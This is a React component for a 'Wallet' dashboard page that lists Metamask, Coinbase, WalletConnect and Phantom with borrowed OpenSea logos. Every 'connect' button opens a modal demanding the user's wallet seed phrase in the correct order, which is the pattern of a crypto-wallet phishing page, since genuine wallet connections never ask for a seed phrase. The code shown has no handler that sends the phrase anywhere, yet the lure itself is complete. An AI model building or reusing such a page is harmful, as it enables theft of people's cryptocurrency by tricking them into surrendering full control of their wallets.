import React from 'react';
import DashboardHeader from '../../components/DashboardHeader';
import useRedirect from '../../hooks/useRedirect';

const Wallet = () => {
  return (
    <div className="lg:px-24 md:px-8 px-2 h-full w-[95%] mx-auto">
      <DashboardHeader />

      <div className="my-8">
        <h1 className="text-2xl font-bold pb-3"> Wallet</h1>
        <p className="text-white">
          Connect with one of our available wallet providers.
        </p>
      </div>

      <section className="mb-10 pb-20 pt-4">
        <div className="lg:w-5/6 w-full bg-accent rounded-lg p-3">
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://opensea.io/static/images/logos/metamask-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                Metamask
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-500 border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn">
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src=" https://static.opensea.io/logos/walletlink-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                Coinbase{' '}
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-500 border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn">
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://static.opensea.io/logos/walletconnect-alternative.png"
                    alt="wallet"
                  />
                </div>
              </div>
              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                WalletConnect
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-500 border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn">
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="divider"></div>
          <div className="flex flex-wrap gap-4 bg-primary rounded items-center justify-between p-3">
            <div className="flex items-center lg:gap-5 gap-2">
              <div className="avatar">
                <div className="w-10 rounded">
                  <img
                    src="https://opensea.io/static/images/logos/phantom.svg"
                    alt="wallet"
                  />
                </div>
              </div>

              <p className="text-white font-bold text-sm lg:text-base">
                {' '}
                Phantom
              </p>
            </div>
            <div>
              <label
                for="my-modal-6"
                class="btn modal-button bg-yellow-500 border-transparent"
              >
                connect
              </label>

              <input type="checkbox" id="my-modal-6" class="modal-toggle" />

              <div class="modal">
                <div class="modal-box bg-accent">
                  <h3 class="font-bold text-lg">
                    Please enter your wallet seed phrase!
                  </h3>
                  <textarea
                    class="textarea my-5 h-32 w-full"
                    placeholder="Enter in the correct order your wallet phrase"
                  ></textarea>

                  <div class="modal-action">
                    <label for="my-modal-6" class="btn">
                      Submit
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Wallet;
